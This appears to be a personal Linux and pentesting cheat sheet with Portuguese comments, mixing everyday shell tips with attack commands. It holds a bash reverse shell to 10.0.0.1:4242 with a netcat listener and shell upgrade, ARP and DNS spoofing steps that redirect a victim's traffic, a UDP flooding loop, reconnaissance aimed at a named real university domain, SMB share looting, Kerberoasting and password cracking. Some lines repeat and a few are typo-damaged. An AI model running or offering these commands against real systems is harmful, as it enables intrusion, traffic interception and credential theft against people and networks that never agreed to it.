$ echo 'export https_proxy="socks(4|5)://<IP>:<PORT>"' >> .bashrc   # Seta um proxy padrao para todos os aplicativos usarem sempre


$ cat arq.txt | tr -dc a-z   # Pega apenas o alfabeto desse arquivo
$ cat arq.txt | tr -d a-z    # Nao pega os chars do alfabeto

$ head -1 /dev/urandom  |tr -dc a-z0-9    # TRAZ APENAS ASCII  RANDOMICOS


./metafind.sh ifes.edu.br pdf      <============ OTIMA FERRAMENTA DE METADADOS PARA ENCONTRAR


$ while true; do echo "hahah" >& /dev/udp/127.0.0.1/666 0>&1 ;done     # ATACANDO A PORTA

  $ yes    # MELHOR COMANDO

 $ last   # Pega os logs de login
________________________________________________
https://manytools.org/hacker-tools/ascii-banner/ |
-------------------------------------------------
https://unit42.paloaltonetworks.com/docker-honeypot/   # Super interessante de compreender isso


Em 1991 surgiu o Kernel Linux criado por Linus Torvalds, não totalmente do "zero", mas sim como uma variação do Minix. O Minix é um sistema operacional Unix-like, escrito em linguagem C e assembly. Somente depois, o Linux foi integrado com o projeto GNU, onde ganhou a sua primeira interface grafica.

$ tail -n +2 input.txt   # Pega todas as ultimas linhas do arquivo, a partir da segunda linha (incluindo a linha numero 2).

$ tail -n +2 input.txt |tr -d "\"" |sort  # Sort faz com que a lista de nome fique em ordem alfabetica

$ ifconfig |grep Bcast |tr -s ' '   # tr -s esse "-s" significa Squeeze, ele vai tirar todos os espacos de uma vez.

Authentication logs:
  # tail /var/log/auth. log
  # grep -i "fail" /var/log/auth. log 


$ cut -d " " -f 3  file.txt | cut -c 2   # Pega a segunda letra da palavra da 3 coluna
--------------------------------------------------------------------------------------------------------------------
ip que começa com 224 a 239. como 224.0.0.251 IGMPv2 por exemplo representa MULTICAST, isto é, está enviando pacotes(dados) para mais de uma máquina na rede
----------------------------------#
cd /opt/impacket/examples/	  |
python GetUserSPNs.py 		  |
----------------------------------#
ngrok start --all -region=eu

txt="haha eu adoro"
echo ${txt/eu/yes}  # Output: haha yes adoro

$ strace -T whoami


https://explainshell.com/explain?cmd=git%20log%20--graph%20--abbrev-commit%20--pretty%3Doneline%20origin..mybranch
ssh -i keyfile -f -N -L 1234:www.google.com:80 host

-----------------------------------------------------------------------------------------
echo $txt |sed -e 's/eu/yes/'  # Output: haha yes adoro
-----------------------------------------------------------------------------------------
ls /bin /usr/bin |sort -u    # Compara dois arquivos juntos
echo .*     # Mostra so os arquivos ocultos
echo $(($((5**2))*3))    # 75
./env |xargs -0 echo -e "\x1b[32m"       # Usa o xargs para modificar a cor do output da execucao do programa em C
file *[!.c]       # file em todos os arquivos que nao tenham .c  (esse comando eu mesmo fiz rsrs)

grep "172" file.txt | grep "WAITFOR" | grep -i "product" |sort -n |python -c "import sys, urllib as ul; print ul.unquote(sys.stdin.read());" |more
killall ssh   # Mata todos os processos do ssh
lastlog -t 30 root  # Exibe todas as vezes que o usuario root logou no sistema

find /var -size +20k  # Procura arquivos com + de 20 Kb.
time find / -type l -exec file {} +
find . -name "*.c" -exec wc -l {} \;
ps aux        # A coluna STAT significa o estado do processo. R(Running) - S(Sleeping) - l(MultiThreaded)
lspci    # Mostra as placas PCI que estao instaladas
lspci -v  # Traz as informacoes detalhadas sobre
du -h #mostra o tamanho de uma pasta em megabytes

iftop -n 
dmesg
sudo ip link set wlan0 promisc on   # Coloca em modo promisquo
cat /var/log/auth.log  #Mostra o registro de autenticação do sistema
dpkg -i visual_code.deb
echo -e '\x1b[5fmaso' # Sendo 5f o numero de linhas que vai parar, por exemplo '\x1b[20fmOLAMUNDO' vai parar na linha 20 pois possui [20f


tail -f /var/log/syslog    # Pega em tempo real o que esta acontecendo no sistema
tail -f /var/log/apache2/access.log

cut -c 1-5 file.txt   # Pega os 5 primeiros caracteres de cada linha

script -a -f pentest.log
--------------------------------------------------------------------------------------------------------------------
FOR LOOP:
$ for((i=0;i<=10;i++));do
  echo $i
done
		OU
for i in `seq 1 10`;do
  echo $i
done
--------------------------------------------------------------------------------------------------------------------
WHILE LOOP:
$cont=0
$while [ $cont -lt 5 ]; do
  echo "count = $cont"
  let cont=cont+1
done
		OUTRO EXEMPLO
$cont=0
$while read line; do
  let cont++
  echo line $cont | $line
done < file
--------------------------------------------------------------------------------------------------------------------
Google Hacking(dorks)---------------------------------------------------------
site:<site> allinurl:login || allinurl:login.php
site:<site> allinurl:id

THEHARVESTER-------------------------------------------------------------------
theharvester -d ifes.edu.br -l 200 -b all
-------------------------------------------------------------------------------
SMBCLIENT----------------------------------------------------------------------
smbclient -L \\\\<ip_do_windows>\\
smbclient \\\\<ip_do_windows>\\Nome_do_servidor
smb: \>RECURSE ON
smb: \>PROMPT OFF
smb: \>mget *
gpp-decrypt <hash>
NETDISCOVER--------------------------------------------------------------------
netdiscover -i wlan0 -r 192.168.15.0/24
-------------------------------------------------------------------------------
DNSENUM------------------------------------------------------------------------
dnsenum ifes.edu.br || dnsenum --enum ifes.edu.br
---------------------------------------------------------------------------------
DIG
dig any ifes.edu.br
----------------------------------------------------------------------------------
NIKTO-----------------------------------------------------------------------------
nikto -host http://ifes.edu.br
----------------------------------------------------------------------------------
DISBUSTER-------------------------------------------------------------------------
dirbuster-------------------------------------------------------------------------
CURL------------------------------------------------------------------------------
curl --head ifes.edu.br #pega o cabeçalho do site, até a versão do servidor web

NMAP------------------------------------------------------------------------------
nmap -T5 -O 192.168.15.0/24 --reason --open --exclude 192.168.15.1<=== scan rapido
nmap -sS -f -sV -Pn -O -g53 192.168.15.1 
nmap -p21 -T5 -v --script vuln 192.168.15.1
nmap -sV --script=ssl-enum-ciphers -p 443 <ip_do_windows>
nmap --script-updatedb
------------------------------------------------------------------------------------
RPCCLIENT---------------------------------------------------------------------------
rpcclient -U "" <ip_do_windows> #pressionar enter sem senha && login==sucess, null session.
ARPSPOOF----------------------------------------------------------------------------
echo "1" > /proc/sys/net/ipv4/ip_forward #para habilitar o encaminhamento de pacotes
arpspoof -i wlan0 -t <ip_alvo> <ip_gateway> 
arpspoof -i wlan0 -t <ip_gateway> <ip_alvo>
------------------------------------------------------------------------------------- 
DNSSPOOF-----------------------------------------------------------------------------
#Esse ataque serve para alterar o ip que o alvo irá acessar, por exemplo um site
> host.conf #criar o arquivo host.conf
echo "<seu_ip> /*.google.com" > host.conf
bettercap -I wlan0 -G <ip_gateway> -T <ip_alvo> --dns host.conf
#toda vez que o usuario acessar o google, ele será redirecionado para sua máquina




ip que começa com 224 a 239. como 224.0.0.251 IGMPv2 por exemplo representa MULTICAST, isto é, está enviando pacotes(dados) para mais de uma máquina na rede

dpkg -i visual_code.deb
lspci
lspci -v

Google Hacking(dorks)---------------------------------------------------------
site:<site> allinurl:login || allinurl:login.php
site:<site> allinurl:id



echo -e '\x1b[5fmaso' # Sendo 5f o numero de linhas que vai parar,por exemplo '\x1b[20fmOLAMUNDO' vai parar na linha 20 pois possui 
o valor magico "[20f"


---------------------- COMMANDS --------------------------------------------------->
cat /etc/*release
pushd /etc; push /var
find /etc/ -name *.conf
grep -rn /etc/ -e netmasks
df -h
du -hsBM /var/* |sort -n
rpm -qi wget ; Esse comando é super importante para saber informações extras 
lsof -i
stty
last
vmstat -S M
mpstat -P ALL 1

tail -f dhcpd. log   # Logs DHCP

ls /etc/init/*.conf    # Lista todos os servicos que iniciam com o Linux


# tcpdump ip6 
# tcpdump -n -A -s0 port http or port ftp or port smtp or port imap or port pop3

# tcpdump -s 1500 -A '(tcp[((tcp[12:1] & 0xf0) >> 2)+5:1] = 0x01) and (tcp[((tcp[12:1] & 0xf0) >> 2) : 1] : 0x16) 





---- SSL

Get SSL Certificate:
    # openssl s_client -connect <URL>:443
    # openssl s_client -connect <SITE>:443 </dev/null 2>/dev/null I sed -ne '/-BEGIN CERTIFICATE-/,/-ENDCERTIFICATE-Ip' > <CERT>.pem


Examine and verify the certificate and check for Self-Signed:
    # openssl x509 -text -in <CERT>.pem
    # openssl x509 -in <CERT>,pem -noout -issuer - subject -startdate -enddate -fingerprint
    # openssl verify <CERT>.pem

Extract Certificate Server Name:
# tshark -nr <PCAP FILE NAME> -Y "ssl. handshake. ciphersuites" -Vx I grep "Server Name:" | sort | uniq -c | sort -r

Extract Certificate info for analysis:
    # ssldump -Nr <FILE NAME>.pcap | awk 'BEGIN {c=0;}  { if ($0 ~ /^[ ]+Certificate$/) {c=l; print
"========================================";} if
($0 !~/^ +/) {c=0;} if (c==l) print $0; }' 




$ hashcat -m <type> -a 3 -o result.txt  cript.txt


python3 -c 'import pty; pty.spawn("/bin/sh")'
export TERM=xterm
Ctrl + z
stty raw -echo;fg

# SEMPRE EXECUTAR COM  rlwrap  PARA EVITAR BUGS QUANDO USAR AS SETINHAS E DEMAIS COISAS
 $ rlwrap nc -lnvp 4444
 $ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1


find / -type f \( -perm -4000 -o -perm -2000 \) -print


 # USEFUL TO FIND FLAGS
find / -name flag.txt 2>/dev/null
find / -name user.txt 2>/dev/null
find / -name .flag 2>/dev/null
find / -name flag 2>/dev/null
find / -name root.txt 2>/dev/null



pkill -9 -t pts/1    # Mata o terminal do coleguinha
